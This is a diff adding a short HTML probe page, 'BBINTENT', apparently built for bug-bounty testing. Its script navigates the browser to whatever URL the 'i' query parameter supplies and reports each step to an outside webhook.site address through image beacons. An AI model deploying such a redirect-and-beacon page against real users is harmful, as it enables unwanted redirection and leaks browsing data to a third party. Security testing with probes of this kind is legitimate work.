@@ -1,0 +1,25 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>BBINTENT</title></head>
+<body><h1>BBINTENT</h1><pre id="o">running</pre>
+<script>
+var HOOK = 'https://webhook.site/eda5d5ab-4ef8-461a-bea9-3dd14b4b4dac';
+function send(tag, s) {
+  try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(s).substr(0, 1000)); } catch (e) {}
+}
+function log(x) { try { document.getElementById('o').textContent += '\n' + x; } catch (e) {} }
+function qp(name) {
+  var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
+  return m ? decodeURIComponent(m[1]) : null;
+}
+var target = qp('i');
+log('target=' + target);
+send('INTENT_START', target || 'none');
+if (target) {
+  setTimeout(function () {
+    log('navigating: ' + target);
+    send('INTENT_NAV', target);
+    try { location.href = target; } catch (e) { send('INTENT_ERR', '' + e); }
+  }, 3000);
+  setTimeout(function () { send('INTENT_STILL_HERE', location.href); }, 9000);
+}
+</script></body></html>
